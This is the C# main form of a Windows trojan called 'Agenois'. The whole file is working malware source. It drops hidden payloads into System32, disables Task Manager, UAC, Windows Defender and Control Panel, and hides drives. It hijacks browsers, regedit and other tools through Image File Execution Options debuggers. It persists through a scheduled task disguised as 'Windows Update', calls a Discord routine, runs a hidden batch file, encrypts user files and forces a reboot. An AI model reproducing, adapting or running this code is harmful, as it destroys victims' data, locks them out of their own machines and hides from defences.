﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using System.IO;
using System.Threading;
using System.Diagnostics;
using Agenois.Properties;
using Agenois.Payloads;
using Agenois.Utils;
using System.Media;
using Microsoft.Win32.TaskScheduler;

namespace Agenois
{
    public partial class MainThread : Form
    {
        public MainThread()
        {
            InitializeComponent();

            string extractPath = @"C:\Windows\System32\Defender";
            Directory.CreateDirectory(@"C:\Windows\System32\Defender");
            
            RegistryKey editKey;

            if (Process.GetProcessesByName("Agenois").Count() > 1) { Environment.Exit(0); }

            if (Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Agenois", "AgenoisInfected", null) == null)
            {
                File.WriteAllBytes(extractPath + @"\Payloads.dll", Resources.Payloads);
                File.WriteAllBytes(extractPath + @"\cursor.ani", Resources.skull1);
                File.WriteAllText(extractPath + @"\Action.bat", Resources.Action);
                File.WriteAllBytes(extractPath + @"\IFEO.exe", Resources.IFEODebugger);
                File.Copy(Application.ExecutablePath, extractPath + @"\Agenois.exe");

                DirectoryInfo ch = new DirectoryInfo(extractPath);
                ch.Attributes = FileAttributes.Hidden;
                
                Destructive.CriticalMode(1);

                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                editKey.SetValue("legalnoticecaption", "Welcom To Your Fresh & New PC ");
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                editKey.SetValue("legalnoticetext", "This Computer has been Infected by the Agenois Trojan. From Now On We(The Creators) Have Full Access To Your PC");
                editKey.Close();
                editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                editKey.SetValue("NoControlPanel", "1");
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Winlogon");
                editKey.SetValue("AutoRestartShell", "0", RegistryValueKind.DWord);
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
                editKey.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
                editKey.Close();
                editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                editKey.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
                editKey.Close();

                editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                editKey.SetValue("NoViewOnDrive", 67108863, RegistryValueKind.DWord);
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                editKey.SetValue("NoDrives", 67108863, RegistryValueKind.DWord);
                editKey.Close();

                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                editKey.SetValue("Arrow", extractPath + "\\cursor.ani");
                editKey.Close();
                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                editKey.SetValue("Hand", extractPath + "\\cursor.ani");
                editKey.Close();
                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                editKey.SetValue("Wait", extractPath + "\\cursor.ani");
                editKey.Close();
                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                editKey.SetValue("AppStarting", extractPath + "\\cursor.ani");
                editKey.Close();
                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                editKey.SetValue("Help", extractPath + "\\cursor.ani");
                editKey.Close();
                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                editKey.SetValue("UpArrow", extractPath + "\\cursor.ani");
                editKey.Close();
                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                editKey.SetValue("No", extractPath + "\\cursor.ani");
                editKey.Close();
                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                editKey.SetValue("SizeWE", extractPath + "\\cursor.ani");
                editKey.Close();
                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                editKey.SetValue("SizeNWSE", extractPath + "\\cursor.ani");
                editKey.Close();
                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                editKey.SetValue("SizeNS", extractPath + "\\cursor.ani");
                editKey.Close();
                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                editKey.SetValue("SizeNESW", extractPath + "\\cursor.ani");
                editKey.Close();
                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                editKey.SetValue("SizeAll", extractPath + "\\cursor.ani");
                editKey.Close();
                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                editKey.SetValue("NWPen", extractPath + "\\cursor.ani");
                editKey.Close();

                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe");
                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe");
                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HelpPane.exe");
                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe");
                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mspaint.exe");
                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DVDMaker.exe");
                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wmplayer.exe");
                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wordpad.exe");
                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SnippingTool.exe");
                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\WindowsAnytimeUpgradeui.exe");
                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\WindowsAnytimeUpgrade.exe");
                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\StikyNot.exe");
                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ehshell.exe");
                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\xpsrchvw.exe");
                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mstsc.exe");
                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe");
                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\opera.exe");
                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\firefox.exe");
                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe");
                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeCP.exe");
                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdge.exe");
                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\resmon.exe");
                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe");
                editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                editKey.Close();
                
                editKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender");
                editKey.SetValue("DisableAntiSpyware", "1", RegistryValueKind.DWord);
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                editKey.SetValue("NoWinkeys", "1", RegistryValueKind.DWord);
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system\ConsentPromptBehaviorAdmin");
                editKey.SetValue("0", RegistryValueKind.DWord);
                editKey.Close();

                Web.Discord();

                Process ScriptProcess = new Process();
                ScriptProcess.StartInfo.CreateNoWindow = true;
                ScriptProcess.StartInfo.UseShellExecute = false;
                ScriptProcess.StartInfo.FileName = extractPath + "\\Action.bat";
                ScriptProcess.Start();

                TaskService ts = new TaskService();
                TaskDefinition td = ts.NewTask();
                td.Principal.RunLevel = TaskRunLevel.Highest;
                LogonTrigger interval = new LogonTrigger();
                interval.Repetition.Interval = TimeSpan.FromMinutes(1);
                td.Triggers.Add(interval);
                td.Actions.Add(new ExecAction(@"C:\Windows\System32\Defender\Agenois.exe", null));
                ts.RootFolder.RegisterTaskDefinition("Windows Update", td);

                Destructive.EncryptUserFiles();

                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Agenois");
                editKey.SetValue("AgenoisInfected", "1");
                editKey.Close();

                Destructive.CriticalMode(0);

                Others.StartProcess("shutdown.exe", "/r /t 0");
            }
            else
            {
                Destructive.CriticalMode(1);

                SoundPlayer soundPlayer = new SoundPlayer(Resources.Audio);
                soundPlayer.Play();
            }
        }

        private void MainThread_Load(object sender, EventArgs e)
        {

        }
    }
}
